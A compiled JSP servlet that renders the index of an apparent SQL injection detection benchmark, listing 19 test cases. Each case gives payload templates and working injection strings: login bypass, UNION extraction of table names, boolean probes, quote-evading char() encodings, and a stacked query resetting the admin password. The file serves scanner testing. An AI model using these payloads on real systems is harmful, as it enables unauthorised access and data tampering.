package org.apache.jsp.active.SQL_002dInjection.SInjection_002dDetection_002dEvaluation_002dPOST_002d200Error;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;

public final class index_jsp extends org.apache.jasper.runtime.HttpJspBase
    implements org.apache.jasper.runtime.JspSourceDependent {

  private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();

  private static java.util.List _jspx_dependants;

  private javax.el.ExpressionFactory _el_expressionfactory;
  private org.apache.AnnotationProcessor _jsp_annotationprocessor;

  public Object getDependants() {
    return _jspx_dependants;
  }

  public void _jspInit() {
    _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();
    _jsp_annotationprocessor = (org.apache.AnnotationProcessor) getServletConfig().getServletContext().getAttribute(org.apache.AnnotationProcessor.class.getName());
  }

  public void _jspDestroy() {
  }

  public void _jspService(HttpServletRequest request, HttpServletResponse response)
        throws java.io.IOException, ServletException {

    PageContext pageContext = null;
    HttpSession session = null;
    ServletContext application = null;
    ServletConfig config = null;
    JspWriter out = null;
    Object page = this;
    JspWriter _jspx_out = null;
    PageContext _jspx_page_context = null;


    try {
      response.setContentType("text/html; charset=ISO-8859-1");
      pageContext = _jspxFactory.getPageContext(this, request, response,
      			null, true, 8192, true);
      _jspx_page_context = pageContext;
      application = pageContext.getServletContext();
      config = pageContext.getServletConfig();
      session = pageContext.getSession();
      out = pageContext.getOut();
      _jspx_out = out;

      out.write("\n");
      out.write("<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n");
      out.write("<html>\n");
      out.write("<head>\n");
      out.write("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">\n");
      out.write("<title>Evaluation of SQL Injection Detection Accuracy - HTTP POST Method</title>\n");
      out.write("</head>\n");
      out.write("<body>\n");
      out.write("\n");
      out.write("<center><font size=\"5\">Injection Test Cases - HTTP 200 Responses with Erroneous Text:</font></center><br><br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp\">Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into string values in the scope of a query within a login page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  'or'[value]'='[value]<br>\n");
      out.write("  'or [value]=[value][comment][space]<br>\n");
      out.write("  <U>Examples of Login Bypass Exploits:</U><br>\n");
      out.write("  Exploit (both input fields): 'or'7'='7<br>\n");
      out.write("  Independent Exploit 1: ' or 7=7--     <br>\n");
      out.write("  Independent Exploit 2: ' or 7=7#     <br>\n");
      out.write("  Independent Exploit 3: ' or 7=7/*     <br>\n");
      out.write("  <br>\n");
      out.write("  \n");
      out.write("<B><a href=\"Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp\">Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into string values in the scope of a query within a search page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  ' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>\n");
      out.write("  <U>Examples of Union Exploits:</U><br>\n");
      out.write("  Exploit: 'or'7'='7<br>\n");
      out.write("  MSSQL Exploit: ' UNION SELECT id, name, 'jfks' FROM sysobjects--     <br>\n");
      out.write("  MySQL Exploit: ' UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables--     <br>\n");
      out.write("  MySQL Exploit (No Comments): ' UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables WHERE table_name like'% <br>\n");
      out.write("  <br>\n");
      out.write("  \n");
      out.write("<B><a href=\"Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp\">Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into string values in the scope of a query within a calculation page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  InvalidValue' OR EXISTS (SELECT * FROM [table] WHERE [field] like '[value]%')[comment mark][space]<br>  \n");
      out.write("  InvalidValue' OR EXISTS (SELECT * FROM [table] WHERE [field] > '[value]')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Boolean Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: InvalidValue624' OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--     <br>\n");
      out.write("  MySQL Exploit (No Comments): InvalidValue624' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u') and '1'='1<br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp\">Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into string values in the scope of a query within an update page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  UPDATE (SET Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  Value'; UPDATE [table] SET [field]='value';[comment mark][space] <br>  \n");
      out.write("  InvalidValue', [field]=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Sql Command Injection Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: Message'; UPDATE users SET password='1234' WHERE username='admin';--     <br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MySQL Exploit: ', message=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--      <br>\n");
      out.write("  MySQL Exploit (No Comments): ', message=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES'), message='a <br>\n");
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp\">Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into an order by clause in the scope of a query within a search page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Non functional Semicolon (input validation)<br>\n");
      out.write("  Injection into an order by clause<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (ORDER BY Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures (Instead of order by field name or index):</U><br>  \n");
      out.write("  (SELECT 1 FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits (replace the entire original input):</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MSSQL Exploit: (SELECT 1 FROM sysobjects WHERE name like'sysusers')--     <br>\n");
      out.write("  MySQL Exploit (No Comments): (SELECT 1 FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES') <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp\">Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into a numeric value in the scope of a query within a private resource view page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [number] or [value]=[value] or [value]=[value]<br>\n");
      out.write("  [number] or [value]=[value][comment][space]<br>\n");
      out.write("  <U>Examples of Permission Bypass Exploits:</U><br>\n");
      out.write("  Exploit 1: 1 or 7=7--     <br>\n");
      out.write("  Exploit 2: 1 or 7=7#     <br>\n");
      out.write("  Exploit 3: 1 or 7=7/*     <br>\n");
      out.write("  Exploit 4 (No Comments): 1 or 7=7 or 7=7<br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp\">Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into numeric values in the scope of a query within a search page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  1 UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>\n");
      out.write("  <U>Examples of Union Exploits:</U><br>\n");
      out.write("  Exploit: 1 or 7=7<br>\n");
      out.write("  MSSQL Exploit: 1 UNION SELECT id, name, 'jfks' FROM sysobjects--     <br>\n");
      out.write("  MySQL Exploit: 1 UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables--     <br>\n");
      out.write("  MySQL Exploit (No Comments): 1 UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables WHERE 1=1 OR 1=1 <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp\">Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into numeric values in the scope of a query within a calculation page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] like '[value]%')[comment mark][space]<br>  \n");
      out.write("  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] > '[value]')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Boolean Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 100000000 OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--     <br>\n");
      out.write("  MySQL Exploit (No Comments): 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u') <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp\">Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into numeric values in the scope of a query within an update page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  UPDATE (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [InvalidNumericValue]; UPDATE [table] SET [field]='value';[comment mark][space] <br>  \n");
      out.write("  [InvalidNumericValue] OR 1=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Sql Command Injection Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 0; UPDATE users SET password='1234' WHERE username='admin';--     <br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MySQL Exploit: 0 OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--      <br>\n");
      out.write("  MySQL Exploit (No Comments): 0 OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')<br>\n");
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp\">Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into an order by clause (numeric index) in the scope of a query within a search page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Non functional Semicolon (input validation)<br>\n");
      out.write("  Injection into an order by clause<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (ORDER BY Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures (Instead of order by field name or index):</U><br>  \n");
      out.write("  (SELECT 1 FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits (replace the entire original input):</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MSSQL Exploit: (SELECT 1 FROM sysobjects WHERE name like'sysusers')--     <br>\n");
      out.write("  MySQL Exploit (No Comments): (SELECT 1 FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES') <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp\">Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into a date value in the scope of a query within a private resource view page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [date value - YYYY-MM-DD]' or [value]=[value] or '[value]'='[value]<br>\n");
      out.write("  [date value - YYYY-MM-DD]' or [value]=[value][comment][space]<br>\n");
      out.write("  <U>Examples of Permission Bypass Exploits:</U><br>\n");
      out.write("  Exploit 1 (MySql): 2010-01-01' or 7=7--     <br>\n");
      out.write("  Exploit 2 (MySql): 2010-01-01' or 7=7#     <br>\n");
      out.write("  Exploit 3 (MySql): 2010-01-01' or 7=7/*     <br>\n");
      out.write("  Exploit 4 (MySql, No Comments): 2010-01-01' or 7=7 or '7'='7<br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp\">Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into date values in the scope of a query within a search page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [date value - YYYY-MM-DD]' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>\n");
      out.write("  <U>Examples of Union Exploits:</U><br>\n");
      out.write("  Exploit: 2010-01-01'or'7'='7<br>\n");
      out.write("  MSSQL Exploit: 2010-01-01' UNION SELECT 1,id, name, '2010-01-01' FROM sysobjects--     <br>\n");
      out.write("  MySQL Exploit: 2010-01-01' UNION SELECT 1, 1, table_name, '2010-01-01' FROM information_schema.tables--     <br>\n");
      out.write("  MySQL Exploit (No Comments): 2010-01-01' UNION SELECT 1, 1, table_name, '2010-01-01' FROM information_schema.tables WHERE 1=1 OR '1'='1 <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp\">Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into date values in the scope of a query within a calculation page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [date value - YYYY-MM-YY]' OR EXISTS (SELECT * FROM [table] WHERE [field] like '[value]%')[comment mark][space]<br>  \n");
      out.write("  [date value - YYYY-MM-YY]' OR EXISTS (SELECT * FROM [table] WHERE [field] > '[value]')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Boolean Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 1900-01-01' OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--     <br>\n");
      out.write("  MySQL Exploit: 1900-01-01' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u')--     <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp\">Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into date values in the scope of a query within an update page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  None<br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  UPDATE (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [InvalidDateValue]'; UPDATE [table] SET [field]='value';[comment mark][space] <br>  \n");
      out.write("  [InvalidDateValue]' OR 1=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Sql Command Injection Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 1900-01-01'; UPDATE users SET password='1234' WHERE username='admin';--     <br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MySQL Exploit: 1900-01-01' OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--      <br>\n");
      out.write("  MySQL Exploit (No Comments): 1900-01-01' OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES') AND '1'='1<br>\n");
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp\">Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into date values in the scope of a query within a view page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Single Quote & Double Quote Input Validation <br>\n");
      out.write("  Injection Into Date Field Without Quotes (Rare) <br> \n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [Date Retrieval DB Specific Function] UNION SELECT [FieldList] FROM [TABLE][comment mark][space] <br>  \n");
      out.write("  [Current Date DB Specific Function] UNION SELECT [FieldList] FROM [TABLE])[comment mark][space]<br>\n");
      out.write("  <U>Sample Exploit Structures (MySQL - will only work via driver, will fail when executed through the query browser):</U><br>\n");
      out.write("  YYYY-MM-DD UNION SELECT [FieldList] FROM [TABLE][comment mark][space] <br>\n");
      out.write("  <U>Examples of Union Exploits (Date Retrieval Methods):</U><br>\n");
      out.write("  (MySQL - CURDATE(), MSSQL - getDate()) <br>\n");
      out.write("  MySQL Exploit: CURDATE() UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES--      <br>\n");
      out.write("  MySQL Exploit (No Comments): CURDATE() UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES<br>\n");
      out.write("  MySQL Exploit (Date without quotes exploit): 2010-01-02 UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES--    <br>\n");
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp\">Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into a numeric value in the scope of a query within a private resource view page with erroneous responses and quote validation.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Single Quote & Double Quote Input Validation <br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [number] or [value]=[value] or [value]=[value]<br>\n");
      out.write("  [number] or [value]=[value][comment][space]<br>\n");
      out.write("  <U>Examples of Permission Bypass Exploits:</U><br>\n");
      out.write("  Exploit 1: 1 or 7=7--     <br>\n");
      out.write("  Exploit 2: 1 or 7=7#     <br>\n");
      out.write("  Exploit 3: 1 or 7=7/*     <br>\n");
      out.write("  Exploit 4 (No Comments): 1 or 7=7 or 7=7<br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp\">Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into numeric values in the scope of a query within a search page with erroneous responses and quote validation.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Single Quote & Double Quote Input Validation <br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  1 UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>\n");
      out.write("  <U>Examples of Union Exploits:</U><br>\n");
      out.write("  Exploit: 1 or 7=7<br>\n");
      out.write("  MSSQL Exploit: 1 UNION SELECT id, name, null FROM sysobjects--     <br>\n");
      out.write("  MySQL Exploit: 1 UNION SELECT 1, table_name, null FROM information_schema.tables--     <br>\n");
      out.write("  MySQL Exploit (No Comments): 1 UNION SELECT 1, table_name, null FROM information_schema.tables WHERE 1=1 OR 1=1 <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp\">Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into numeric values in the scope of a query within a calculation page with erroneous responses and quote validation.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Single Quote & Double Quote Input Validation <br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  SELECT (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] like [converted char value])[comment mark][space]<br>  \n");
      out.write("  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] > [converted char value])[comment mark][space]<br>\n");
      out.write("  <U>Examples of Boolean Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 100000000 OR EXISTS (SELECT * FROM sysobjects WHERE name > chr(117))--     <br>\n");
      out.write("  MySQL Exploit: 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name like concat(char(70),char(73),char(76),char(69),char(83)))--     <br>\n");
      out.write("  MySQL Exploit (No Comments): 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > char(117)) <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp\">Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp</a></B><br>\n");
      out.write("  Injection into numeric values in the scope of a query within an update page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Single Quote & Double Quote Input Validation <br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      out.write("  UPDATE (WHERE Clause)<br>\n");
      out.write("  <U>Sample Exploit Structures:</U><br>\n");
      out.write("  [InvalidNumericValue]; UPDATE [table] SET [field]='value';[comment mark][space] <br>  \n");
      out.write("  [InvalidNumericValue] OR 1=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Sql Command Injection Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 0; UPDATE users SET password= chr(49)+chr(50)+chr(51)+chr(52) WHERE username= chr(97)+chr(100)+chr(109)+chr(105)+chr(110);--     <br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MySQL Exploit: 0 OR 1=(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME like concat(char(70),char(73),char(76),char(69),char(83)))--      <br>\n");
      out.write("  MySQL Exploit (No Comments): 0 OR 1=(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME like concat(char(70),char(73),char(76),char(69),char(83)))<br>\n");
      out.write("  (Change WHERE condition to \"like char(37)\" for reponse differentiation)\n");
      out.write("  <br> \n");
      out.write("\n");
      out.write("</body>\n");
      out.write("</html>");
    } catch (Throwable t) {
      if (!(t instanceof SkipPageException)){
        out = _jspx_out;
        if (out != null && out.getBufferSize() != 0)
          try { out.clearBuffer(); } catch (java.io.IOException e) {}
        if (_jspx_page_context != null) _jspx_page_context.handlePageException(t);
      }
    } finally {
      _jspxFactory.releasePageContext(_jspx_page_context);
    }
  }
}
